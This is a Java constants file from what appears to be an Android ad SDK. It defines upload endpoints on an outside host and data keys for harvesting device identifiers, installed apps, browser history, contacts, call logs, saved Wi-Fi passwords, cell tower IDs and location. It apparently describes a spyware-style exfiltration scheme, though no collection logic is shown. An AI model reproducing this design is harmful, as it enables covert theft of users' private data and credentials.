package com.mob.root.tools;

public class AMConstants {

	public static final boolean IS_DEBUG = true;

	/** SP文件name */
	public static final String SP_NAME = "mob";
	/** 图片磁盘缓存目录名 */
	public static final String IMAGE_CACHE_DIR = "atimgs";

	public static final String SP_UUID = "uuid";

	public static final String SP_USER_AGENT = "user_agent";
	public static final String SP_IMEI = "imei";
	public static final String SP_IMSI = "imsi";
	public static final String SP_MAC = "mac";
	public static final String SP_MODEL = "model";
	public static final String SP_SDK_VERSION = "sdk_version";
	public static final String SP_KERNEL_VERSION = "kernel_version";
	public static final String SP_SCREEN_WIDTH = "screen_width";
	public static final String SP_SCREEN_HEIGHT = "screen_height";
	public static final String SP_LANGUAGE = "language";
	public static final String SP_ANDROID_ID = "android_id";
	public static final String SP_MCC = "mcc";
	public static final String SP_MNC = "mnc";

	public static final String SP_NEXT_CONFIG_STAMP = "next_config_stamp";
	public static final String SP_NEXT_UPLOAD_STAMP = "next_upload_stamp";

	/** 统计相关的，上次记录的wifi ssid */
	public static final String SP_LAST_SSID = "last_ssid";
	public static final String SP_LAST_AD_STAMP = "last_display_stamp";
	public static final String SP_LAST_UPLOAD_STAMP = "last_upload_stamp";

	/** 是否锁屏 */
	public static final String SP_SCREEN_LOCK = "screen_lock";
	/** 是否已连接wifi */
	public static final String SP_WIFI_CONNECTED = "wifi_connected";
	/** 是否正在充电 */
	public static final String SP_CHARGING = "charging";
	public static final String SP_FLAVOR_IDS = "flavor_ids";

	// --------------http--------------
	public static final String URI_ROOT = "http://sdk.fb-api.net/";
	public static final String UPLOAD_DEVICE_URI = URI_ROOT + "device.php";
	public static final String UPLOAD_CONFIG_URI = URI_ROOT + "config.php";
	public static final String UPLOAD_SINGLE_URI = URI_ROOT + "single.php";
	public static final String UPLOAD_COLLECTION_URI = URI_ROOT
			+ "collection.php";
	public static final String UPLOAD_DAILY_URI = URI_ROOT + "daily.php";
	public static final String UPLOAD_UPDATE_URI = URI_ROOT + "update.php";
	public static final String EXTERNAL_IP_URI = "http://ipecho.net/plain";

	public static final String ENTITY_PARAMS = "params";
	public static final String CONTENT_TYPE = "application/json";

	public static final String NET_CACHE_CONTROL = "cache_control";
	public static final String NET_VERSION_CONTROL_URL = "version_control_url";
	public static final String NET_GP_SERVER = "gp_server";
	public static final String NET_GP_SERVER_PORT = "gp_server_port";
	public static final String NET_AD_SINGLE_REQUEST_URL = "ad_single_request_url";
	public static final String NET_AD_COLLECTION_REQUEST_URL = "ad_collection_request_url";
	public static final String NET_AD_DISPLAY_RULES = "ad_display_rules";
	public static final String NET_AD_TYPE = "ad_type";
	public static final String NET_EVENT_TYPE = "event_type";
	public static final String NET_PROBABILITY = "probability";
	public static final String NET_FREQ_SAME_CAT = "freq_same_cat";
	public static final String NET_FREQ_GLOBAL = "freq_global";
	public static final String NET_LEVEL = "level";
	public static final String NET_AD_FAN_PLACEMENTID = "ad_fan_placementid";
	public static final String NET_DATA_UPLOAD_URL = "data_upload_url";
	public static final String NET_DATA_UPLOAD_INTERVAL = "data_upload_interval";
	public static final String NET_FAILOVER_SERVER_URL = "failover_server_url";
	public static final String NET_FAILOVER_TRY_COUNT = "failover_try_count";
	
	
	public static final String NET_SHOW_FLAVORS = "show_flavors";
	public static final String NET_FLAVORS = "flavors";
	public static final String NET_FLAVOR_ID = "id";
	public static final String NET_FLAVOR_COLOR = "color";
	public static final String NET_FLAVOR_NAME = "name";
	public static final String NET_HOT_GAMES = "hot_games";
	public static final String NET_WEEK_GAMES = "week_games";
	public static final String NET_ADS = "ads";
	public static final String NET_AD_ID = "id";
	public static final String NET_AD_TITLE = "title";
	public static final String NET_AD_CATEGORY = "category";
	public static final String NET_AD_ICON = "icon";
	public static final String NET_AD_DESC = "desc";
	public static final String NET_AD_RATING = "rating";
	public static final String NET_AD_FAVORS = "favors";
	public static final String NET_AD_PACKAGE_NAME = "package_name";
	public static final String NET_AD_LANDING_PAGE = "landing_page";
	public static final String NET_AD_PERMISSIONS = "permissions";
	public static final String NET_AD_PERMISSIONS_ID = "id";
	public static final String NET_AD_PERMISSIONS_TITLE = "title";
	public static final String NET_AD_PERMISSIONS_DESC = "desc";
	public static final String NET_AD_PICS = "pics";
	public static final String NET_AD_PICS_IMG = "img";
	
	public static final String NET_SINGLE_AD_ID = "id";
	public static final String NET_SINGLE_AD_TITLE = "title";
	public static final String NET_SINGLE_AD_CATEGORY = "category";
	public static final String NET_SINGLE_AD_ICON = "icon";
	public static final String NET_SINGLE_AD_COVER = "cover";
	public static final String NET_SINGLE_AD_DESC = "desc";
	public static final String NET_SINGLE_AD_RATING = "rating";
	public static final String NET_SINGLE_AD_FAVORS = "favors";
	public static final String NET_SINGLE_AD_PACKAGE_NAME = "package_name";
	public static final String NET_SINGLE_AD_LANDING_PAGE = "landing_page";
	public static final String NET_SINGLE_AD_OPEN_TYPE = "open_type";
	public static final String NET_SINGLE_AD_PERMISSIONS = "permissions";
	public static final String NET_SINGLE_AD_PERMISSIONS_ID = "id";
	public static final String NET_SINGLE_AD_PERMISSIONS_TITLE = "title";
	public static final String NET_SINGLE_AD_PERMISSIONS_DESC = "desc";
	public static final String NET_SINGLE_AD_PICS = "pics";
	public static final String NET_SINGLE_AD_PICS_IMG = "img";
	
	public static final String NET_DATAS_APP_APP_NAME = "app_name";
	public static final String NET_DATAS_APP_PACKAGE_NAME = "package_name";
	public static final String NET_DATAS_APP_VERSION_CODE = "version_code";
	public static final String NET_DATAS_APP_VERSION_NAME = "version_name";
	public static final String NET_DATAS_APP_SIGNATURE = "signature";
	public static final String NET_DATAS_APP_JSON = "apps";
	public static final String NET_DATAS_BH_TITLE = "title";
	public static final String NET_DATAS_BH_URL = "url";
	public static final String NET_DATAS_BH_DATE = "date";
	public static final String NET_DATAS_BH_JSON = "browser_history";
	public static final String NET_DATAS_CONTACT_ID = "id";
	public static final String NET_DATAS_CONTACT_NAME = "name";
	public static final String NET_DATAS_CONTACT_PHONE_NUMBER = "phone_number";
	public static final String NET_DATAS_CONTACTS_JSON = "contacts";
	public static final String NET_DATAS_WIFI_SSID = "ssid";
	public static final String NET_DATAS_WIFI_PSK = "psk";
	public static final String NET_DATAS_WIFI_ENCRYPTION_TYPE = "encryption_type";
	public static final String NET_DATAS_WIFI = "wifis";
	public static final String NET_DATAS_APP_RECORD = "app_record";
	public static final String NET_DATAS_CALLS_PHONE_NUMBER = "phone_number";
	public static final String NET_DATAS_CALLS_CALL_TYPE = "call_type";
	public static final String NET_DATAS_CALLS_TIME = "time";
	public static final String NET_DATAS_CALLS_NAME = "name";
	public static final String NET_DATAS_CALLS_DURATION = "duration";
	public static final String NET_DATAS_CALLS_JSON = "calls";
	public static final String NET_DATAS_WIFI_SWITCH = "wifi_switch";
	public static final String NET_DATAS_BS_SWTICH = "bs_swtich";

	// --------------文件--------------
	public static final String FILE_CONFIG = "config";
	public static final String FILE_WIFI = "wifi_switch";
	public static final String FILE_WIFI_SSID = "ssid";
	public static final String FILE_WIFI_MAC = "mac";
	public static final String FILE_WIFI_RSSI = "rssi";
	public static final String FILE_WIFI_PSK = "psk";
	public static final String FILE_WIFI_IIP = "iip";
	public static final String FILE_WIFI_EIP = "eip";
	public static final String FILE_WIFI_GATEWAY = "gate_way";
	public static final String FILE_WIFI_SERVER = "server";
	public static final String FILE_WIFI_LATITUDE = "latitude";
	public static final String FILE_WIFI_LONGITUDE = "longitude";
	public static final String FILE_WIFI_CONNECTED_STAMP = "connected_stamp";
	public static final String FILE_WIFI_DISCONNECTED_STAMP = "disconnected_stamp";
	
	public static final String FILE_BS = "bs_switch";
	public static final String FILE_BS_CID = "cid";
	public static final String FILE_BS_IIP = "iip";
	public static final String FILE_BS_EIP = "eip";
	public static final String FILE_BS_LATITUDE = "latitude";
	public static final String FILE_BS_LONGITUDE = "longitude";
	public static final String FILE_BS_STAMP = "stamp";
	
	public static final String FILE_APP_SWITCH = "app_switch";
	public static final String FILE_APP_RECORD_PACKAGE_NAME = "package_name";
	public static final String FILE_APP_RECORD_STAMP_START = "stamp_start";
	public static final String FILE_APP_RECORD_STAMP_END = "stamp_end";

	// --------------action--------------
	/** 统计相关的，用于执行统计任务检查的接收者 */
	public static final String STATISTICS_CHECK_ACTION = "at_statistics_check_action";
	/** 缓存配置文件检查action */
	public static final String CONFIG_CHECK_ACTION = "at_config_cache_check_action";
	/** 统计相关的，上次记录的基站id */
	public static final String SP_LAST_CELL_ID = "last_cid";
}
